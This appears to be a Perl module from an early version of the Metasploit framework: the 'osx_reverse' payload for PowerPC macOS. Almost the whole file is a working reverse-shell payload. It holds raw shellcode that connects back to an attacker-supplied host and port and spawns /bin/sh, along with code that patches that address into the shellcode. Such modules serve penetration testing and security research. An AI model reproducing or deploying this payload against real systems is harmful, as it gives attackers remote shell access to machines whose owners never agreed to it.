package Msf::Payload::osx_reverse;
use strict;
use base 'Msf::PayloadComponent::ReverseConnection';

my $info =
{
  'Name'         => 'osx_reverse',
  'Version'      => '$Revision$',
  'Description'  => 'Connect back to attacker and spawn a shell',
  'Authors'      => [ 'H D Moore <hdm [at] metasploit.com> [Artistic License]', ],
  'Arch'         => [ 'ppc' ],
  'Priv'         => 0,
  'OS'           => [ 'osx' ],
  'Size'         => '',
};

sub new {
  my $class = shift;
  my $hash = @_ ? shift : { };
  $hash = $class->MergeHash($hash, {'Info' => $info});
  my $self = $class->SUPER::new($hash, @_);

  $self->_Info->{'Size'} = $self->_GenSize;
  return($self);
}

sub Build {
  my $self = shift;
  return($self->Generate($self->GetVar('LHOST'), $self->GetVar('LPORT')));
}

sub Generate {
  my $self = shift;
  my $host = shift;
  my $port = shift;
  my $off_port = 34;
  my $off_host = 36;
  my $shellcode = pack('N*',
    0x38800002,0x38a00001,0x38c00006,0x38600061,
    0x44000002,0x7c000278,0x7c7e1b78,0x4800000d,
    0x0002AAAA,0xBBBBBBBB,0x7ca802a6,0x38c00010,
    0x38600062,0x7fc4f378,0x44000002,0x7c000278,
    0x38a00002,0x3860005a,0x7fc4f378,0x44000002,
    0x7c000278,0x38a5ffff,0x2c05ffff,0x4082ffe9,
    0x7c842278,0x38600017,0x44000002,0x7c000278,
    0x7ca52a79,0x4082fffd,0x7c6802a6,0x3863001c,
    0x9061fff8,0x90a1fffc,0x3881fff8,0x3800003b,
    0x44000002,0x2f62696e,0x2f736800
  );
  
  my $host_bin = gethostbyname($host);
  my $port_bin = pack('n', $port);

  substr($shellcode, $off_host, 4, $host_bin);
  substr($shellcode, $off_port, 2, $port_bin);
  return($shellcode);
}

sub _GenSize {
  my $self = shift;
  my $bin = $self->Generate('127.0.0.1', 4444);
  return(length($bin));
}

1;
